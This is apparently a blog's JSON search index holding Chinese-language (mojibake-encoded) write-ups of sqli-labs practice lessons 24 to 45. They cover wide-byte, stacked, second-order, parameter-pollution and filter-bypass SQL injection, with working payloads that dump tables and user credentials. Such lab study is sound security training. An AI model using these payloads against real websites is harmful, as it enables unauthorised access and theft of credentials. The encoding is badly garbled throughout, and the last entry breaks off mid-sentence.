åŠŸèƒ½ï¼šæ‰§è¡Œä¸€ä¸ªæˆ–å¤šä¸ªé’ˆå¯¹æ•°æ®åº“çš„æŸ¥è¯¢ã€‚å¤šä¸ªæŸ¥è¯¢ç”¨åˆ†å·è¿›è¡Œåˆ†éš”ã€‚ æ³¨ï¼šè¿™ä¸ªå‡½æ•°æ˜¯å¯å®ç°å †å æ³¨å…¥çš„é‡è¦å› ç´ ï¼ mysql_store_result()å‡½æ•°ï¼šåŠŸèƒ½ï¼šç”¨äºå°†mysqli_query()æŸ¥è¯¢çš„ç»“æœé›†å­˜å‚¨åˆ°å˜é‡ä¸­ mysqli_more_results()å‡½æ•°ï¼šè¯­æ³•ï¼šmysqli_more_results(connection);å‚æ•°ï¼šconnectionâ€”â€”å¿…éœ€ã€‚è§„å®šè¦ä½¿ç”¨çš„mysqlè¿æ¥åŠŸèƒ½ï¼šæ£€æŸ¥ä¸€ä¸ªå¤šæŸ¥è¯¢æ˜¯å¦æœ‰æ›´å¤šçš„ç»“æœã€‚ mysqli_fetch_row() å‡½æ•°ï¼š è¯­æ³•ï¼šmysqli_fetch_row(result)ï¼› å‚æ•°ï¼šresultâ€”â€”å¿…é¡»ã€‚è§„å®šç”± mysqli_query()ã€mysqli_store_result() æˆ– mysqli_use_result() è¿”å›çš„ç»“æœ é›†æ ‡è¯†ç¬¦ã€‚ åŠŸèƒ½ï¼šä»ç»“æœé›†ä¸­å–å¾—ä¸€è¡Œï¼Œå¹¶ä½œä¸ºæšä¸¾æ•°ç»„è¿”å›ã€‚ lesson39&amp;40&amp;41ï¼šå°±æ”¹å˜äº†idé—­åˆæ–¹å¼ï¼Œæ³¨æ„æ³¨å…¥ç±»å‹å˜åŒ–å³å¯ï¼Œå…¶ä½™ä¸lesson38ä¸€è‡´ã€‚ lesson42ï¼šè¿™å…³å¯ä»¥ç”¨äºŒé˜¶æ³¨å…¥ï¼Œä½†æ˜¯æ²¡å¿…è¦ï¼Œå› ä¸ºæˆ‘ä»¬è¾“å…¥çš„å¯†ç æ²¡æœ‰è¢«è¿‡æ»¤ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨æŠ¥é”™æ³¨å…¥ï¼Œå»¶æ—¶æ³¨å…¥ã€‚æˆ–è€…ç”¨æˆ‘ä»¬æ–°å­¦çš„å †å æ³¨å…¥ã€‚ åœ¨æˆ‘ä»¬ä½¿ç”¨å †å æ³¨å…¥æ—¶è™½ç„¶é¡µé¢è¿”å›é”™è¯¯ï¼Œä½†æ˜¯æˆ‘ä»¬åœ¨æ•°æ®åº“ä¸­æŸ¥æ‰¾ï¼Œè¿˜æ˜¯å¯ä»¥çœ‹åˆ°æˆ‘ä»¬çš„payloadæ‰§è¡Œlã€‚ lesson43&amp;44&amp;45ï¼šå°±æ”¹å˜äº†idé—­åˆæ–¹å¼ï¼Œæ³¨æ„æ³¨å…¥ç±»å‹å˜åŒ–å³å¯ï¼Œå…¶ä½™ä¸lesson42ä¸€è‡´ã€‚","tags":[{"name":"sqlilabs","slug":"sqlilabs","permalink":"http://example.com/tags/sqlilabs/"}]},{"title":"lesson32-37","date":"2021-02-06T05:17:38.000Z","path":"2021/02/06/lesson32-37/","text":"backgroundâ€”â€”å®½å­—èŠ‚æ³¨å…¥ï¼š åŸç†ï¼šmysqlåœ¨ä½¿ç”¨GBKç¼–ç çš„æ—¶å€™ï¼Œä¼šè®¤ä¸ºä¸¤ä¸ªå­—ç¬¦ï¼ˆå‰ä¸€ä¸ªå­—ç¬¦çš„asciiç å¿…é¡»å¤§äº128æ‰èƒ½åˆ°æ±‰å­—çš„èŒƒå›´ï¼‰ã€‚ï¼‰ä¸ºä¸€ä¸ªæ±‰å­—ï¼Œä¾‹å¦‚%aa%5cå°±æ˜¯ä¸€ä¸ªæ±‰å­—ã€‚ ä»¥lesson32ä¸ºä¾‹ï¼ŒæŸ¥çœ‹æºç å‘ç°PHPä¼šå¯¹\\ï¼ˆåæ–œæ ï¼‰,&#39;ï¼ˆå•å¼•å·ï¼‰,&quot;ï¼ˆåŒå¼•å·ï¼‰åšè½¬ä¹‰å¤„ç† 12345678910111213141516171819202122232425262728function check_addslashes($string)&#123; $string = preg_replace(&#x27;/&#x27;. preg_quote(&#x27;\\\\&#x27;) .&#x27;/&#x27;, &quot;\\\\\\\\\\\\&quot;, $string); //escape any backslash $string = preg_replace(&#x27;/\\&#x27;/i&#x27;, &#x27;\\\\\\&#x27;&#x27;, $string); //escape single quote with a backslash $string = preg_replace(&#x27;/\\&quot;/&#x27;, &quot;\\\\\\&quot;&quot;, $string); //escape double quote with a backslash return $string;&#125;// take the variables if(isset($_GET[&#x27;id&#x27;]))&#123;$id=check_addslashes($_GET[&#x27;id&#x27;]);//echo &quot;The filtered request is :&quot; .$id . &quot;&lt;br&gt;&quot;;//logging the connection parameters to a file for analysis.$fp=fopen(&#x27;result.txt&#x27;,&#x27;a&#x27;);fwrite($fp,&#x27;ID:&#x27;.$id.&quot;\\n&quot;);fclose($fp);// connectivity mysql_query(&quot;SET NAMES gbk&quot;);$sql=&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;$result=mysql_query($sql);//!å¯¹äºæºç çš„è§£è¯»ï¼šæˆ‘è®¤ä¸º24-26è¡Œçš„å‘½ä»¤ç›®çš„æ˜¯å°†sqlè¯­å¥ç”¨gbkç¼–ç ï¼Œä»¥é˜²å¸¦å…¥æ•°æ®åº“åä¹±ç ã€‚$row = mysql_fetch_array($result); é‚£ä¹ˆæˆ‘ä»¬åˆ©ç”¨å®ƒä¼šå°†sqlè¯­å¥è½¬ä¸ºgbkç¼–ç ï¼Œé€šè¿‡åå¹¶\\ï¼ˆurlç¼–ç %5cï¼‰çš„æ–¹å¼ç»•å¼€å…¶å¯¹å•å¼•å·çš„è½¬ä¹‰ã€‚ä¾‹å¦‚ï¼š%aa%5cï¼Œè¿™åœ¨gbkç¼–è¯‘åæˆä¸ºä¸€ä¸ªæ±‰å­—ã€‚ï¼ˆgbkç¼–ç è¡¨https://www.qqxiuzi.cn/zh/hanzi-gbk-bianma.phpï¼‰æ¯”å¦‚ ä¹— å­—ç¬¦ï¼ŒGBKç¼–ç  %81%5C è¡¥å……ï¼šæœ‰äº›ç¬¦å·ï¼ˆ# $ ^ &amp; * + =ï¼‰åœ¨URLä¸­æ˜¯ä¸èƒ½ç›´æ¥ä¼ é€’çš„ï¼Œå¦‚æœè¦åœ¨URLä¸­ä¼ é€’è¿™äº›ç‰¹æ®Šç¬¦å·ï¼Œé‚£ä¹ˆå°±è¦ä½¿ç”¨ä»–ä»¬çš„ç¼–ç äº†ã€‚ç¼–ç çš„æ ¼å¼ä¸ºï¼š%åŠ å­—ç¬¦çš„ASCIIç ï¼Œå³ä¸€ä¸ªç™¾åˆ†å·%ï¼Œåé¢è·Ÿå¯¹åº”å­—ç¬¦çš„ASCIIï¼ˆ16è¿›åˆ¶ï¼‰ç å€¼ã€‚ï¼ˆURLç¼–ç å°±æ˜¯åœ¨uft-8ç¼–ç çš„åŸºç¡€ä¸Šï¼Œç»™ç¼–ç çš„æ¯ä¸ªå­—èŠ‚åŠ ä¸Šç™¾åˆ†å·ã€‚ï¼‰ lesson32ï¼šçˆ†åº“ï¼špayloadï¼š 1?id&#x3D;%aa&#39; union select 1,2,database()--+ çˆ†è¡¨ï¼špayload: 1?id&#x3D;%aa&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;0x7365637572697479--+ æ³¨ï¼šçˆ†è¡¨æœ¬åº”è¯¥æ˜¯?id=%aaâ€™ union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=â€™securityâ€™â€“+ ä½†æ˜¯å› ä¸ºPHPå¯¹&#39;è½¬ä¹‰ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ç”¨åå…­è¿›åˆ¶æ¥è¡¨ç¤ºsecurity çˆ†åˆ—ï¼špayload: 1?id&#x3D;%aa&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_schema&#x3D;0x7365637572697479--+ çˆ†å€¼ï¼špayload: 1?id&#x3D;%aa&#39; union select 1,2,group_concat(username,0x2c,password) from users--+ lesson33ï¼šå’Œlesson32ä¸€æ¨¡ä¸€æ ·ã€‚ lesson34ï¼šè¿™å…³æˆ‘è¿˜ä»¥ä¸ºä¼šå’Œä¹‹å‰ä¸¤å…³ä¸€æ ·ï¼Œåªä¸è¿‡æ”¹ä¸ºpostç±»å‹ï¼Œç»“æœå‘ç°äº†ä¸€äº›ä¸åŒã€‚ å½“æˆ‘åœ¨usernameè¾“å…¥admin%aaâ€™ union select 1,database()#ï¼Œç™»å…¥å¤±è´¥ï¼ŒæŒ‰ç†æ¥è¯´ä¸åº”è¯¥å‘€ã€‚äºæ˜¯æˆ‘ç”¨burpsuiteæŠ“åŒ…ï¼š æˆ‘ä»¬æ˜æ˜è¾“å…¥çš„uname=admin%aaâ€™ union select 1,database()#ï¼Œå¯æ˜¯æˆ‘ä»¬çœ‹åˆ°å¤šäº†ä¸€ä¸ª25åœ¨%aaä¸­é—´ï¼Œè¿™æ˜¯ä»€ä¹ˆæƒ…å†µå‘¢ï¼ŸåŸæ¥ï¼Œgetä¸postæäº¤æ•°æ®ç±»å‹ä¸åŒï¼Œgetå‹å¦‚æœè¾“å…¥ç¬¦åˆurlçš„æ ¼å¼é‚£ä¹ˆå°±ç›´æ¥ä»¥urlå½¢å¼æäº¤ï¼Œä¹Ÿå°±æ˜¯è¯´é‡åˆ°%aaè¿™ç§ç›´æ¥å½“åšurlç¼–ç å¤„ç†ï¼Œè€Œpostå‹å´ä¸æ˜¯è¿™æ ·ï¼Œä»–ä¼šæŠŠä½ æäº¤çš„%aaå½“åšæ­£å¸¸æ•°æ®ï¼Œç„¶åè¿›è¡Œurlç¼–ç ï¼Œäºæ˜¯å°±å˜æˆäº†%25aaã€‚ é‚£ä¹ˆæˆ‘ä»¬è¦æ€ä¹ˆé¿å…è¿™ä¸ªé—®é¢˜å‘¢? æˆ‘ä»¬å¯ä»¥ç”¨burpæŠ“åŒ…ï¼Œæ‰‹åŠ¨å»æ‰25 è¡¥å……ï¼šä¸åŒç±»å‹ç¼–ç  UTF-16ç¼–ç ï¼šä¸€ä¸ªè‹±æ–‡å­—æ¯å­—ç¬¦æˆ–ä¸€ä¸ªæ±‰å­—å­—ç¬¦å­˜å‚¨éƒ½éœ€è¦2ä¸ªå­—èŠ‚ï¼ˆUnicodeæ‰©å±•åŒºçš„ä¸€äº›æ±‰å­—å­˜å‚¨éœ€è¦4ä¸ªå­—èŠ‚ï¼‰ã€‚UTF-8ç¼–ç ï¼šä¸€ä¸ªè‹±æ–‡å­—ç¬¦ç­‰äºä¸€ä¸ªå­—èŠ‚ï¼Œä¸€ä¸ªä¸­æ–‡ï¼ˆå«ç¹ä½“ï¼‰ç­‰äºä¸‰ä¸ªå­—èŠ‚ã€‚ä¸­æ–‡æ ‡ç‚¹å ä¸‰ä¸ªå­—èŠ‚ï¼Œè‹±æ–‡æ ‡ç‚¹å ä¸€ä¸ªå­—èŠ‚Unicodeç¼–ç ï¼šä¸€ä¸ªè‹±æ–‡ç­‰äºä¸¤ä¸ªå­—èŠ‚ï¼Œä¸€ä¸ªä¸­æ–‡ï¼ˆå«ç¹ä½“ï¼‰ç­‰äºä¸¤ä¸ªå­—èŠ‚ã€‚ä¸­æ–‡æ ‡ç‚¹å ä¸¤ä¸ªå­—èŠ‚ï¼Œè‹±æ–‡æ ‡ç‚¹å ä¸¤ä¸ªå­—èŠ‚ã€‚ â€”ï¼‰æˆ‘ä»¬è¿˜å¯ä»¥ç”¨å¦å¤–ä¸€ç§æ–¹å¼ï¼š?id=ç‰›â€™ or 1=1# åœ¨ç»è¿‡urlç¼–ç åï¼Œç‰›è¢«ç¼–ç æˆä¸‰ä¸ªå­—èŠ‚åŠ ä¸Šå•å¼•å·ä¸€ä¸ªå­—èŠ‚ï¼Œå†åŠ ä¸Šå•å¼•å·è¢«è½¬ä¹‰ååæ–œæ ä¸€ä¸ªå­—èŠ‚ï¼Œæ€»å…±äº”ä¸ªå­—èŠ‚ï¼Œæˆ‘ä»¬å·²ç»çŸ¥é“gbkç¼–ç æ—¶ä¸¤ä¸ªå­—èŠ‚ä¸ºä¸€æ±‰å­—ï¼Œé‚£ä¹ˆè¿™æ ·è½¬ä¹‰å•å¼•å·ç”¨çš„åæ–œæ è¢«åˆå¹¶ï¼Œå•å¼•å·â€œé€ƒé€¸â€æˆåŠŸã€‚ https://www.qqxiuzi.cn/bianma/Unicode-UTF.phpåœ¨çº¿Unicodeå’ŒUTFç¼–ç è½¬æ¢ç½‘å€ lesson35ï¼šæ²¡è¥å…» lesson36ï¼šå’Œlesson32ä¸€æ ·ï¼Œåªä¸è¿‡æŠŠè¿‡æ»¤å‡½æ•°æ”¹æˆmysql_real_escape_stringï¼ˆï¼‰ã€‚ lesson37ï¼šå’Œlesson34ä¸€æ ·ï¼Œåªä¸è¿‡æŠŠè¿‡æ»¤å‡½æ•°æ”¹æˆmysql_real_escape_stringï¼ˆï¼‰ã€‚","tags":[{"name":"sqlilabs","slug":"sqlilabs","permalink":"http://example.com/tags/sqlilabs/"}]},{"title":"lesson29-31","date":"2021-02-05T08:14:01.000Z","path":"2021/02/05/lesson29-31/","text":"backgroundï¼šé¦–å…ˆï¼Œæˆ‘ä»¬å…ˆæ¥äº†è§£ä¸€ä¸‹ä»€ä¹ˆæ˜¯webåº”ç”¨çš„åŸºæœ¬æ¶æ„ï¼š lesson29è¿™å…³ä¸­ï¼ŒæœåŠ¡ç«¯webåº”ç”¨æœ‰ä¸¤ä¸ªï¼Œä¸€ä¸ªæ˜¯ä»¥tomcatä¸ºå¼•æ“çš„jspå‹æœåŠ¡å™¨ï¼Œä¸€ä¸ªæ˜¯ä»¥apacheä¸ºå¼•æ“çš„phpå‹æœåŠ¡å™¨ï¼š æ‰“å¼€indexjspæŸ¥çœ‹æºç ï¼š æ–¹æ¡†å†…æ‰§è¡Œçš„æ˜¯åˆ¤æ–­tomcatè·å–çš„idæ˜¯å¦ä¸ºçº¯æ•°å­—ã€‚ æ¥ç€ï¼Œå¦‚æœidæ˜¯çº¯æ•°å­—ï¼Œå®ƒâ€œç¡®è®¤å®‰å…¨â€ï¼Œå°±ä¼šæŠŠè¾“å…¥ä¼ é€’ç»™apacheæœåŠ¡å™¨ã€‚ è¿™è¿‡ç¨‹ä¸­tomcatçš„ä½œç”¨å°±ç›¸å½“äºä¸€é“wafï¼ˆé˜²ç«å¢™ï¼‰ã€‚é‚£ä¹ˆæˆ‘ä»¬æ€ä¹ˆç»•è¿‡è¿™ä¸ªé˜²ç«å¢™å‘¢ï¼Ÿ æ‚‰çŸ¥ï¼Œå¤§å¤šæ•°æœåŠ¡å™¨å¯¹å‚æ•°çš„è§£æï¼š ä¹Ÿå°±æ˜¯è¯´ï¼Œå½“é‡åˆ°å¤šä¸ªå‚æ•°æ—¶ï¼Œtomcatåªä¼šè·å–ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œå¯¹å…¶è¿›è¡Œä¸Šè¿°å¤„ç†ï¼Œåªè¦ç¬¬ä¸€ä¸ªå‚æ•°å¤åˆå®ƒçš„è¦æ±‚ï¼Œtomcatå°±ä¼šæŠŠæˆ‘ä»¬çš„è¾“å…¥ä¼ é€’åˆ°ä¸‹ä¸€çº§ã€‚å› æ­¤æˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸€ç‰¹ç‚¹ï¼Œæ„é€ å¤šä¸ªå‚æ•°æ¥è¾¾åˆ°ç›®çš„ã€‚ lesson29ï¼šçˆ†åº“ï¼špayloadï¼š 1http:&#x2F;&#x2F;127.0.0.1:8080&#x2F;tomcat-files&#x2F;sqli-labs&#x2F;Less-29&#x2F;?id&#x3D;1&amp;id&#x3D;0&#39;union select 1,2,database()--+ çˆ†è¡¨ï¼špayload: 1http:&#x2F;&#x2F;127.0.0.1:8080&#x2F;tomcat-files&#x2F;sqli-labs&#x2F;Less-29&#x2F;?id&#x3D;1&amp;id&#x3D;0&#39;union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;security&#39;--+ çˆ†åˆ—ï¼špayload: 1http:&#x2F;&#x2F;127.0.0.1:8080&#x2F;tomcat-files&#x2F;sqli-labs&#x2F;Less-29&#x2F;?id&#x3D;1&amp;id&#x3D;0&#39;union select 1,2,group_concat(column_name) from information_schema.columns where table_schema&#x3D;&#39;security&#39;--+ çˆ†å€¼ï¼špayload: 1http:&#x2F;&#x2F;127.0.0.1:8080&#x2F;tomcat-files&#x2F;sqli-labs&#x2F;Less-29&#x2F;?id&#x3D;1&amp;id&#x3D;0&#39;union select 1,2,group_concat(username,0x3a,password) from users--+ lesson30ï¼šæ³¨å…¥ç±»å‹ï¼š&quot; ï¼Œå…¶ä½™ä¸€æ ·ã€‚ lesson31ï¼šæ³¨å…¥ç±»å‹ï¼š&quot;) ï¼Œå…¶ä½™ä¸€æ ·ã€‚","tags":[{"name":"sqlilabs","slug":"sqlilabs","permalink":"http://example.com/tags/sqlilabs/"}]},{"title":"lesson25-28a","date":"2021-02-04T08:26:27.000Z","path":"2021/02/04/lesson25-28a/","text":"lesson25ï¼šè¿™ä¸€å…³å®ƒå‘Šè¯‰æˆ‘ä»¬andå’Œoréƒ½è¢«è¿‡æ»¤äº†ã€‚ ä¸€èˆ¬ï¼Œç»•å¼€è¿‡æ»¤çš„æ–¹æ³•æœ‰ä»¥ä¸‹å‡ ç§ï¼š ï¼ˆ1ï¼‰å¤§å°å†™å˜å½¢ Or,OR,oR ï¼ˆ2ï¼‰ç¼–ç ï¼Œhexï¼Œurlencode ï¼ˆ3ï¼‰æ·»åŠ æ³¨é‡Š/or/ ï¼ˆ4ï¼‰åˆ©ç”¨ç¬¦å· and=&amp;&amp;ï¼Œor=|| ï¼ˆ5ï¼‰æ„é€ å­—ç¬¦ä¸²â€”â€”oorrï¼Œanandd æˆ‘ä»¬æŸ¥çœ‹æºç ï¼š è¿™é‡Œçš„orå’Œandé‡‡ç”¨äº†iæ­£åˆ™åŒ¹é…ï¼Œå¤§å°å†™éƒ½æ— æ³•ç»•è¿‡ã€‚ { æ‹“å±•ä¸€ä¸‹PHPæ­£åˆ™è¡¨è¾¾å¼çš„æ¨¡å¼ä¿®é¥°ç¬¦ i â€‹ å¦‚æœè®¾å®šæ­¤ä¿®æ­£ç¬¦ï¼Œæ¨¡å¼ä¸­çš„å­—ç¬¦å°†åŒæ—¶åŒ¹é…å¤§å°å†™å­—æ¯ã€‚ må½“è®¾å®šäº†æ­¤ä¿®æ­£ç¬¦ï¼Œâ€œè¡Œèµ·å§‹â€å’Œâ€œè¡Œç»“æŸâ€é™¤äº†åŒ¹é…æ•´ä¸ªå­—ç¬¦ä¸²å¼€å¤´å’Œç»“æŸå¤–ï¼Œè¿˜åˆ†åˆ«åŒ¹é…å…¶ä¸­çš„æ¢è¡Œç¬¦çš„ä¹‹åå’Œä¹‹å‰ã€‚ så¦‚æœè®¾å®šäº†æ­¤ä¿®æ­£ç¬¦ï¼Œæ¨¡å¼ä¸­çš„åœ†ç‚¹å…ƒå­—ç¬¦ï¼ˆ.ï¼‰åŒ¹é…æ‰€æœ‰çš„å­—ç¬¦ï¼ŒåŒ…æ‹¬æ¢è¡Œç¬¦ã€‚æ²¡æœ‰æ­¤è®¾å®šçš„è¯ï¼Œåˆ™ä¸åŒ…æ‹¬æ¢è¡Œç¬¦ã€‚ xå¦‚æœè®¾å®šäº†æ­¤ä¿®æ­£ç¬¦ï¼Œæ¨¡å¼ä¸­çš„ç©ºç™½å­—ç¬¦é™¤äº†è¢«è½¬ä¹‰çš„æˆ–åœ¨å­—ç¬¦ç±»ä¸­çš„ä»¥å¤–å®Œå…¨è¢«å¿½ç•¥ï¼Œåœ¨æœªè½¬ä¹‰çš„å­—ç¬¦ç±»ä¹‹å¤–çš„ #ä»¥åŠä¸‹ä¸€ä¸ªæ¢è¡Œç¬¦ä¹‹é—´çš„æ‰€æœ‰å­—ç¬¦ï¼ŒåŒ…æ‹¬ä¸¤å¤´ï¼Œä¹Ÿéƒ½è¢«å¿½ç•¥ã€‚ } é‚£ä¹ˆè¿™å…³æˆ‘ä»¬å°±ä»¥åŒå†™ç»•è¿‡çš„æ–¹å¼ä¸ºä¾‹ã€‚ æŸ¥çœ‹æºç ï¼š 1$sql=&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;; ä»ä¸­å¾—çŸ¥è¿™å…³ä¸ºå•å¼•å·ç±»å‹æ³¨å…¥ã€‚ å½“è¾“å…¥?id=1æ—¶ï¼Œé¡µé¢æœ‰å›æ˜¾ã€‚é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥é‡‡ç”¨unionè”åˆæ³¨å…¥ã€‚ çˆ†åº“:è¾“å…¥ï¼š?id=0â€™ union select 1,2,database()â€“+ å¾—ï¼Œ çˆ†è¡¨ï¼šè¾“å…¥ï¼š?id=0â€™ union select 1,2,group_concat(table_name) from infoorrmation_schema.tables where table_schema=â€™securityâ€™â€“+ å¾—ï¼Œ æ³¨ï¼šinformationä¸­ä¹Ÿå«æœ‰orï¼Œå› æ­¤ä¹Ÿéœ€è¦åšç»•è¿‡å¤„ç†ã€‚ çˆ†åˆ—ï¼šè¾“å…¥ï¼š?id=0â€™ union select 1,2,group_concat(column_name) from infoorrmation_schema.columns where table_schema=â€™securityâ€™â€“+ å¾—ï¼Œ çˆ†å€¼ï¼šè¾“å…¥ï¼š?id=0â€™ union select 1,2,group_concat(username,0x3a,passwoorrd) from usersâ€“+ å¾—ï¼Œ æ³¨ï¼špasswordä¸­ä¹Ÿå«æœ‰orï¼Œå› æ­¤ä¹Ÿéœ€è¦åšç»•è¿‡å¤„ç†ã€‚ lesson25a:å’Œlesson25æ²¡ä»€ä¹ˆåŒºåˆ«ï¼Œæ³¨æ„æ³¨å…¥ç±»å‹å°±å¥½äº†ã€‚ lesson26ï¼šæŸ¥çœ‹æºç ï¼š æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å®ƒå°±è¿‡æ»¤äº†ä¸€å †å­—ç¬¦ã€‚æ­¤æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥é‡‡ç”¨URLç¼–ç ç»•è¿‡è¿™äº›è¿‡æ»¤ï¼š + URL ä¸­+å·è¡¨ç¤ºç©ºæ ¼ %2Bç©ºæ ¼ URLä¸­çš„ç©ºæ ¼å¯ä»¥ç”¨+å·æˆ–è€…ç¼–ç  %20/ åˆ†éš”ç›®å½•å’Œå­ç›®å½• %2F? åˆ†éš”å®é™…çš„URLå’Œå‚æ•° %3F% æŒ‡å®šç‰¹æ®Šå­—ç¬¦ %25# è¡¨ç¤ºä¹¦ç­¾ %23&amp; URL ä¸­æŒ‡å®šçš„å‚æ•°é—´çš„åˆ†éš”ç¬¦ %26= URL ä¸­æŒ‡å®šå‚æ•°çš„å€¼ %3D æˆ‘ä¸çŸ¥é“ä¸ºä»€ä¹ˆç©ºæ ¼æˆ‘ä¸€ç›´æ‰¾ä¸åˆ°ç»•å¼€çš„æ–¹æ³•ï¼Œä¸Šé¢çš„å‡ ç§éƒ½ä¸è¡Œï¼Œå¥½åƒæ˜¯apacheçš„é—®é¢˜ï¼Œè¦æˆ‘ä»¬ç”¨linuxç³»ç»Ÿæ‰èƒ½ç»•è¿‡ã€‚æ—¢ç„¶è¿™æ ·æˆ‘ä»¬åªèƒ½é¿å…è¾“å…¥ç©ºæ ¼äº†ï¼Œä½¿ç”¨æŠ¥é”™æ³¨å…¥â€”â€” çˆ†åº“ï¼šè¾“å…¥ï¼š?id=1â€™||updatexml(1,concat(â€˜~â€™,database()),1)||â€™1â€™=â€™1 å¾—ï¼Œ çˆ†è¡¨ï¼šè¾“å…¥ï¼š?id=1â€™||updatexml(1,concat(â€˜~â€™,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=â€™securityâ€™))),1)||â€™1â€™=â€™1 å¾—ï¼Œ çˆ†åˆ—ï¼šè¾“å…¥ï¼š?id=1â€™||updatexml(1,concat(â€˜~â€™,(select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_name=â€™usersâ€™anandd(table_schema=â€™securityâ€™)))),1)||â€™1â€™=â€™1 å¾—ï¼Œ çˆ†å€¼ï¼šè¾“å…¥ï¼š?id=1â€™||updatexml(1, concat(0x7e,(select(group_concat(concat_ws(0x7e,username,passwoorrd)))from(security.users))) ,1)||â€™1â€™=â€™1 å¾—ï¼Œ è¿™é‡Œæœ‰ä¸€ä¸ªé—®é¢˜ï¼Œlimitå› ä¸ºè¿‡æ»¤å› ç´ ç”¨ä¸äº†ï¼Œå¾ˆéš¾å—ï¼Œè€Œä¸”æŠ¥é”™é•¿åº¦åˆæœ‰é™ï¼Œé‚£ä¹ˆè¿™æ—¶æˆ‘ä»¬å¯ä»¥é€šè¿‡æ§åˆ¶idçš„å€¼æ¥ä¸€ä¸ªä¸ªæŸ¥è¯¢ï¼Œä¾‹å¦‚è¾“å…¥ï¼š?id=1â€™ || updatexml(1, concat(0x7e, (select (group_concat( concat_ws(0x7e,username,passwoorrd) )) from (security.users) where(id=5))) ,1) || â€˜1â€™=â€™1 lesson26aï¼šå½“æˆ‘ä»¬è¾“å…¥å¯¼è‡´sqlè¯­æ³•é”™è¯¯çš„æ—¶å€™ï¼Œä¸ä¼šå›æ˜¾ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±æ— æ³•ä½¿ç”¨æŠ¥é”™æ³¨å…¥äº†ã€‚ lesson27ï¼šåŒlesson26ï¼ŒæŠ¥é”™æ³¨å…¥ã€‚ æºç ï¼š è‹¥æƒ³ä½¿ç”¨unionè”åˆæ³¨å…¥ï¼Œåªéœ€è¦å°† union å’Œ select æ”¹ä¸ºå¤§å°å†™æ··åˆå°±å¯ä»¥äº†ã€‚ è¿™å…³å–æ¶ˆäº†å¯¹andå’Œorçš„è¿‡æ»¤ã€‚ lesson27aï¼šä¸èƒ½ä½¿ç”¨æŠ¥é”™æ³¨å…¥ã€‚","tags":[{"name":"sqlilabs","slug":"sqlilabs","permalink":"http://example.com/tags/sqlilabs/"}]},{"title":"lesson24","date":"2021-02-03T13:07:57.000Z","path":"2021/02/03/lesson24/","text":"lesson24ï¼šè¿™å…³æ„Ÿè§‰å¾ˆæœ‰æ„æ€ã€‚ä»¥å¾€çš„SQLæ³¨å…¥éƒ½æ˜¯ä¸€é˜¶æ³¨å…¥ï¼Œè€Œè¿™ä¸€å…³å‡ºç°äº†äºŒé˜¶æ³¨å…¥ã€‚å…ˆä»‹ç»ä¸€ä¸‹äºŒé˜¶æ³¨å…¥ï¼š äºŒé˜¶æ³¨å…¥ä¹Ÿå«å­˜å‚¨å‹çš„æ³¨å…¥ï¼Œå°±æ˜¯å°†å¯èƒ½å¯¼è‡´ sql æ³¨å…¥çš„å­—ç¬¦å…ˆå­˜å…¥åˆ°æ•°æ®åº“ä¸­ï¼Œå½“å†æ¬¡è°ƒç”¨è¿™ä¸ªæ¶æ„æ„é€ çš„å­—ç¬¦æ—¶ï¼Œå°±ä¼šè§¦å‘sql æ³¨å…¥ã€‚ æˆ‘ä»¬å…ˆåœ¨é¡µé¢ä¸Šåšä¸€äº›è¯•æ¢ã€‚ ç‚¹å‡»ï¼šForgot your passwordï¼Ÿ é¡µé¢è·³è½¬ï¼š å¤§æ„æ˜¯å¦‚æœä½ å¿˜äº†ä½ çš„å¯†ç ï¼Œå°±è‡ªå·±é»‘äº†ä»–ã€‚é‚£ä¹ˆæˆ‘ä»¬è‚¯å®šä¸èƒ½åœ¨è¿™é‡Œä¸‹æ‰‹äº†ã€‚ ç‚¹å‡»ï¼šNew User click here? é¡µé¢è·³è½¬ï¼š æˆ‘ä»¬çœ‹åˆ°è¿™å°±æ˜¯ä¸€ä¸ªæ™®é€šçš„æ³¨å†Œç•Œé¢ï¼Œæœ‰ä»€ä¹ˆç”¨å‘¢ï¼Œæˆ‘ä»¬å…ˆæš‚ä¸è¨€è¡¨ã€‚ æˆ‘ä»¬æ¥ç€è¯•æ¢ï¼Œè¾“å…¥æ­£ç¡®è´¦å·å¯†ç ï¼Œè¿›å…¥åˆ°ä¸€ä¸ªä¿®æ”¹å¯†ç çš„ç½‘é¡µï¼š ä¸çŸ¥é“å“ªä¸ªåœ°æ–¹å¯ä»¥æ³¨å…¥ï¼Œæˆ‘ä»¬å…ˆæ‰“å¼€loginçš„æºç ï¼š å‘ç°ç™»å…¥é¡µé¢è¾“å…¥çš„è´¦å·å¯†ç éƒ½è¢«è½¬ä¹‰äº†ï¼Œé‚£ä¹ˆè‚¯å®šä¸èƒ½ç›´æ¥æ³¨å…¥ï¼Œæ¥ç€çœ‹ä»£ç ï¼š 1$_SESSION[&quot;username&quot;] = $login; å‘ç°å®ƒè®¾äº†ä¸€ä¸ªæ–°å˜é‡å‚¨å­˜ä»æ•°æ®åº“ä¸­é€‰æ‹©å‡ºæ¥çš„usernameçš„å€¼ã€‚ æ‰“å¼€pass_changeçš„æºç ï¼š æˆ‘ä»¬å¯ä»¥çœ‹å‡ºä»æ”¹å¯†ç çš„é¡µé¢æ³¨å…¥æ˜¯ä¸å¯è¡Œçš„äº†ï¼Œä½†æ˜¯æˆ‘ä»¬å‘ç°ä»æ•°æ®åº“ä¸­é€‰æ‹©å‡ºæ¥çš„usernameæ²¡æœ‰è¢«å¤æŸ¥ï¼Œç›´æ¥æ„é€ æˆsqlè¯­å¥ï¼Œå¸¦å…¥åˆ°æ•°æ®åº“ä¸­ã€‚äºæ˜¯æˆ‘ä»¬å°±å¯ä»¥æœ‰è¿™æ 